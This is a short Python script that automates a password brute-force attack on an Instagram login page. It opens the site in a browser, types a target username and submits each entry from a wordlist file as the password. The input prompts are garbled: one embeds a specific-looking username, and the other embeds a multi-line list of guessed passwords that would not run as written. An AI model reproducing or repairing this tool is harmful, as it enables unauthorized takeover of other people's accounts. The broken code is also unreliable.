from webbot import Browser
from pynput.keyboard import Key, Controller
import time
username = input('ssa.2022.marchsadness: ')
dictionary = input('jacko
1234
45561
limak
kasih
gurua
testi
12345
54321
54312
tools
jeemm
genoa
trips
jacko
democ
repub
trust
thats
fives
chara
cters
can't
beuse
inthe
insta
gram
page
sooo
uneed
six
chara
cters
Real_Password ')

file = open(f'{dictionary}.txt', 'r')
bruteforce = []
for line in file:
    line = line.strip()
    bruteforce.append(line)
file.close()

web = Browser()
keyboard = Controller()


web.go_to('www.instagram.com')
time.sleep(3)
keyboard.press(Key.enter)
keyboard.release(Key.enter)
time.sleep(3)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
time.sleep(3)
web.type(username)
keyboard.press(Key.tab)
keyboard.release(Key.tab)
for brute in bruteforce:
    web.type(brute, into="Password")
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)
